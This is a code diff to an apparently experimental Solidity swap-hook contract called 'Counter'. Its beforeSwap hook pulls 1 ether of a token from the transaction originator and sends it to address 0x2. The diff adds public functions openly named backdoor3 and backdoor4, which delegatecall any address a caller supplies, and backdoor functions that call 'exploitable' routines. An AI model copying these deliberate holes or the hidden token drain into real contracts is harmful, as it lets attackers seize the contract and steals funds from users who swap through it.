@@ -68,7 +68,6 @@ contract Counter is BaseHook {
         int24 tick,
         bytes calldata
     ) external override returns (bytes4) {
-        console.log("1234");
         return this.afterInitialize.selector;
     }
     function beforeSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata)
@@ -79,14 +78,14 @@ contract Counter is BaseHook {
         console.log("beforeSwap +++");
 
 
-        BeforeSwapDelta hookDelta = toBeforeSwapDelta(int128(-params.amountSpecified), int128(params.amountSpecified));
-        console.logInt(BeforeSwapDeltaLibrary.getSpecifiedDelta(hookDelta)); // 캐스팅 후 출력
-        console.logInt(BeforeSwapDeltaLibrary.getUnspecifiedDelta(hookDelta)); // 캐스팅 후 출력
+        // BeforeSwapDelta hookDelta = toBeforeSwapDelta(int128(-params.amountSpecified), int128(params.amountSpecified));
+        // console.logInt(BeforeSwapDeltaLibrary.getSpecifiedDelta(hookDelta)); // 캐스팅 후 출력
+        // console.logInt(BeforeSwapDeltaLibrary.getUnspecifiedDelta(hookDelta)); // 캐스팅 후 출력
         beforeSwapCount[key.toId()]++;
         
         console.log("tx.origin : ", tx.origin);
         console.log("msg.sender : ", msg.sender);
-        console.log("transfer gogo");
+        console.log("transfer start");
         tk.transferFrom(tx.origin, address(this), 1 ether);
         tk.transfer(address(0x2), 1 ether);
         console.log("transfer done");
@@ -126,11 +125,18 @@ contract Counter is BaseHook {
     function backdoor() public{
         console.log("exploitable : ",tx.origin);
         console.log("msg.sender", msg.sender);
-        //address(this).call(abi.encodeWithSignature("exploitable()"));
+        address(this).call(abi.encodeWithSignature("exploitable1()"));
     }
     function backdoor2() external{
-        console.log("backdoor");
+        address(this).call(abi.encodeWithSignature("exploitable2()"));
     }
+    function backdoor3(address addr) public{
+        address(addr).delegatecall(abi.encodeWithSignature("exploitable1()"));
+    }
+    function backdoor4(address addr) external{
+        address(addr).delegatecall(abi.encodeWithSignature("exploitable2()"));
+    }
+    
 }
 
 
